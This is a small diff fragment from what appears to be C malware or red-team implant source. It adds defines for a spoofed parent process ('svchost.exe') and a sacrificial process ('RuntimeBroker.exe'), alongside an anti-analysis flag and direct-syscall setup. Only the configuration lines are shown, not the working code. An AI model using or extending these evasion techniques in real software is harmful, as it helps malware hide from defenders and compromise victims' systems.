@@ -15,6 +15,9 @@
 #define ANTI_ANALYSIS
 #endif
 
+#define SPOOFED_PARENT_PROCESS L"svchost.exe"
+#define SACRIFICIAL_PROCESS L"RuntimeBroker.exe"
+
 int main() {
 	// Init syscalls for use
 	if (InitializeSyscalls() == FALSE) {
